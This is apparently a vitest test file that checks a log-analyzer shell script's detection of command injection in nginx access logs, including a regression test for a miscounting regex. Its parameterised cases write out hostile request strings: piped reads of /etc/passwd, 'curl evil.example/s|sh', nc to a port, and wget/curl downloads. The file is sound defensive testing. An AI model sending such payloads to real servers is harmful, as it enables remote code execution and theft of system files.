import { readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { install, runFile, sandbox, scriptsDir, type Sandbox } from '../helpers/shell-sandbox.ts';

// These tests run the real log-analyzer.sh against an nginx access log written into a scratch directory.
// The script is installed the way the deploy installs it, with its /var/log and /tmp paths redirected
// into the sandbox, and it only reads the log files named by its environment variables.

interface CommandInjectionReport {
  /** The report's top summary, which lists every attack category that was counted. */
  summary: string;
  /** The "COMMAND INJECTION ATTEMPTS" section of the report. */
  section: string;
}

function analyze(box: Sandbox, lines: string[]): CommandInjectionReport {
  const accessLog = path.join(box.root, 'access.log');
  writeFileSync(accessLog, `${lines.join('\n')}\n`);
  const script = install(box, 'log-analyzer.sh', readFileSync(path.join(scriptsDir, 'log-analyzer.sh'), 'utf8'), {
    withHelper: false,
  });
  const result = runFile(script, [], box, {
    NGINX_ACCESS_LOG: accessLog,
    NGINX_ERROR_LOG: path.join(box.root, 'missing-error.log'),
    AUTH_LOG: path.join(box.root, 'missing-auth.log'),
    SYSLOG: path.join(box.root, 'missing-syslog'),
    LOG_ANALYZER_LOG: path.join(box.root, 'log-analyzer.log'),
  });
  expect(result.status, result.stderr).toBe(0);
  const start = result.stdout.indexOf('COMMAND INJECTION ATTEMPTS');
  const end = result.stdout.indexOf('BRUTE FORCE ATTEMPTS');
  expect(start).toBeGreaterThan(-1);
  expect(end).toBeGreaterThan(start);
  return {
    summary: result.stdout.slice(0, result.stdout.indexOf('NGINX ACCESS LOG ANALYSIS')),
    section: result.stdout.slice(start, end),
  };
}

const nginxLine = (request: string, userAgent = 'Mozilla/5.0') =>
  `203.0.113.7 - - [09/Nov/2026:00:00:06 +0000] "GET ${request} HTTP/1.1" 200 4708 "-" "${userAgent}"`;

// Lines from the 9 November report that was counted as 28,131 command injection attempts.
const ORDINARY_TRAFFIC = [
  nginxLine('/law/725', 'mwmbl/1.1.2 (https://github.com/mwmbl/mwmbl/ contact mwmbl@me.stone-red.net)'),
  nginxLine('/', 'SentryUptimeBot/1.0 (+http://docs.sentry.io/product/alerts/uptime-monitoring/)'),
  nginxLine('/api/v1/laws?limit=25&offset=0&sort=score&order=desc&category_id=23'),
  nginxLine('/api/v1/laws?cat=5&limit=25'),
  nginxLine('/search?q=cat+and+shell&sort=score'),
];

describe('log-analyzer.sh command injection detection', () => {
  it('reports nothing for ordinary traffic', () => {
    const report = analyze(sandbox(), ORDINARY_TRAFFIC);
    expect(report.section).toContain('No command injection attempts detected');
    expect(report.summary).not.toContain('Command Injection');
  });

  it('does not count a clean log once per pattern', () => {
    // Before the fix a pattern that began with an unescaped `|` matched every line, so the count was the
    // number of requests multiplied by the number of such patterns.
    const report = analyze(sandbox(), Array.from({ length: 50 }, (_, i) => nginxLine(`/law/${i}`)));
    expect(report.section).toContain('No command injection attempts detected');
  });

  it.each([
    ['a piped cat', '/x?a=1|cat /etc/passwd'],
    ['a URL-encoded pipe', '/x?a=1%7Ccat%20/etc/passwd'],
    ['a pipe into sh', '/x?c=curl+evil.example/s|sh'],
    ['a piped nc', '/x?a=1|nc 203.0.113.9 4444'],
    ['a piped wget', '/x?a=1|wget http://203.0.113.9/a'],
    ['a piped curl', '/x?a=1|curl http://203.0.113.9/a'],
    ['a piped bash', '/x?a=1|bash -i'],
    ['an ampersand cat', '/x?a=1&cat%20/etc/hosts'],
    ['a semicolon cat', '/x?a=1;cat%20/etc/hosts'],
    ['a backtick cat', '/x?a=`cat /etc/hosts`'],
    ['a subshell cat', '/x?a=$(cat /etc/hosts)'],
  ])('flags %s', (_name, request) => {
    const report = analyze(sandbox(), [...ORDINARY_TRAFFIC, nginxLine(request)]);
    expect(report.section).toMatch(/Detected [1-9]\d* potential command injection attempts/);
    expect(report.section).toContain(request);
    expect(report.summary).toMatch(/Command Injection: [1-9]\d* attempts/);
    for (const line of ORDINARY_TRAFFIC) {
      // The sample list prints each line cut to 120 characters.
      expect(report.section).not.toContain(line.slice(0, 120));
    }
  });
});
